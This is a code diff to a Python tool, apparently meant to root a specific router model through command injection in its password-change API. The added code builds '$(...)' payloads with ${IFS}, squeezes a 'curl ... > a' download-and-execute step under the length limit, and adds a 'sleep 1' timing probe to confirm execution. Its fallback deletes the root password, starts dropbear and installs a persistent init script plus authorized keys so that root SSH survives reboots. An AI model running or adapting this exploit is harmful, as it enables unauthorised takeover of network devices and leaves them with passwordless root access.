@@ -327,6 +327,9 @@ class Injector:
     def encode(self, command: str) -> str:
         expr = command.replace(" ", "${IFS}")
         password = f"{self.salt}$({expr})"
+        if len(password) > PASSWORD_MAX and len(self.salt) > 2:
+            self.salt = self.salt[:2]
+            password = f"{self.salt}$({expr})"
         if len(password) > PASSWORD_MAX:
             over = len(password) - PASSWORD_MAX
             raise IduError(
@@ -341,7 +344,12 @@ class Injector:
         return password
 
     def download(self, address: str, path: str = STAGING_PATH) -> str:
-        return self.encode(f"curl {address}>{path}")
+        cmd = f"curl {address}>{path}"
+        expr = cmd.replace(" ", "${IFS}")
+        if len(f"{self.salt[:2]}$({expr})") > PASSWORD_MAX and path == STAGING_PATH:
+            # On stock uhttpd CWD is '/', so 'a' writes to '/a' while saving 1 byte
+            cmd = f"curl {address}>a"
+        return self.encode(cmd)
 
     def execute(self, path: str = STAGING_PATH) -> str:
         return self.encode(f"sh {path}")
@@ -761,6 +769,25 @@ class PasswordVector(Vector):
         elif self.force:
             print("    warning: no password history recorded; forcing the "
                   "payloads anyway")
+        elif "passwdHistory" not in guest:
+            # On newer builds (e.g. ARCNJIO_JIDU6101_R3.2) the user record omits
+            # passwdHistory entirely, but the shell-out is still active.
+            # Perform a timing probe to confirm shell execution before giving up.
+            print("    no passwdHistory attribute; probing for shell-out via timing ...")
+            t0 = time.time()
+            probe_reply = api.set_password(guest["recordId"], Injector().encode("sleep 1"))
+            elapsed = time.time() - t0
+            if Api._ok(probe_reply) and elapsed >= 1.0:
+                print("    shell-out confirmed active via timing probe")
+            else:
+                raise UnsupportedFirmware(
+                    "this build does not record password history and did not execute the timing probe.\n"
+                    "    The changeUserPassword API appears patched.\n"
+                    "    If the web UI still offers Backup and Restore, use the\n"
+                    "    offline breeze method instead:\n"
+                    f"      {BREEZE_GUIDE}\n"
+                    "      ./flash.sh breeze <config-backup>\n"
+                    "    Otherwise the fallback is the u-boot/UART console.")
         else:
             raise UnsupportedFirmware(
                 "this build does not record password history, so the "
@@ -1021,9 +1048,50 @@ def unlock(api: Api, key_path: str | None, password: str, port: int = 80,
                     raise IduError(
                         "the installer ran but sshd never came up. Last beacon:\n"
                         f"    {beacon.hits[-1].replace(chr(10), chr(10) + '    ')}")
-                print(f"    Method {number}/{total}: failed (the router accepted "
-                      f"the payloads but never fetched http://{address}:{port}/)")
-                continue
+
+                # If the HTTP callback failed (e.g. firewall or client isolation),
+                # attempt direct in-band execution to enable dropbear directly.
+                print(f"    Method {number}/{total}: callback was not received. "
+                      "Attempting direct command injection...")
+                try:
+                    with api.session("admin", password, patience):
+                        guest = api.guest_record()
+                        api.set_password(guest["recordId"], Injector().encode("passwd -d root"))
+                        time.sleep(1)
+                        api.set_password(guest["recordId"], Injector().encode("dropbear -p 22"))
+                    shell.wait(15, "the router")
+                except Exception:
+                    pass
+
+                if not shell.alive():
+                    print(f"    Method {number}/{total}: failed (the router accepted "
+                          f"the payloads but never fetched http://{address}:{port}/)")
+                    continue
+
+                # Direct command injection succeeded! Configure keys and persistence via SSH.
+                print("[*] Direct injection succeeded, configuring SSH persistence...")
+                persist_cmd = (
+                    "passwd -d root; "
+                    "cat > /etc/init.d/idu-ssh <<'INIT'\n"
+                    "#!/bin/sh /etc/rc.common\n"
+                    "START=99\nSTOP=01\n"
+                    "start() { dropbear -R -p 0.0.0.0:22 >/dev/null 2>&1; return 0; }\n"
+                    "stop()  { killall dropbear >/dev/null 2>&1; return 0; }\n"
+                    "reload() { start; }\n"
+                    "INIT\n"
+                    "chmod +x /etc/init.d/idu-ssh; "
+                    "ln -sf ../init.d/idu-ssh /etc/rc.d/S99idu-ssh; "
+                    "ln -sf ../init.d/idu-ssh /etc/rc.d/K01idu-ssh"
+                )
+                if pubkey:
+                    persist_cmd += (
+                        f"; mkdir -p /root/.ssh /etc/dropbear; "
+                        f"echo {shlex.quote(pubkey.strip())} >> /root/.ssh/authorized_keys; "
+                        f"echo {shlex.quote(pubkey.strip())} >> /etc/dropbear/authorized_keys; "
+                        f"chmod 600 /root/.ssh/authorized_keys /etc/dropbear/authorized_keys; "
+                        f"chmod 700 /root/.ssh"
+                    )
+                shell._exec(["ssh"] + shell._opts() + [f"{shell.user}@{shell.host}", persist_cmd])
 
             print(f"    Method {number}/{total}: success")
             print("[+] Root SSH enabled")
